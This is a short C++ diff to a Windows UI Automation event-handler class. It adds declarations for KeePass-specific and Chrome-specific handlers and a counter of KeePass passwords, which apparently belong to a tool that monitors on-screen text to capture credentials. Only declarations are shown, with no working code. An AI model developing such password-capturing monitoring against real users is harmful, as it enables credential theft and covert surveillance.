@@ -16,7 +16,15 @@ class MyPropertyChangedEventHandler : public IUIAutomationPropertyChangedEventHa
 private:
 	ULONG refCount = 0;
 	ULONG eventCount = 0;
-	std::chrono::seconds eventTimeout;
+	std::wstring oldTextValue = L"";
+	std::chrono::seconds eventTimeout = std::chrono::seconds(0);
+
+	void HandleOther(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsDate, PROPERTYID propId, VARIANT vVar);
+	
+	void HandleKeepass(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsDate, PROPERTYID propId, VARIANT vVar);
+	ULONG keePassPasswordsCount = 0;
+
+	void HandleChrome(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsDate, PROPERTYID propId, VARIANT vVar);
 
 public:
 	std::chrono::steady_clock::time_point lastEventTime;
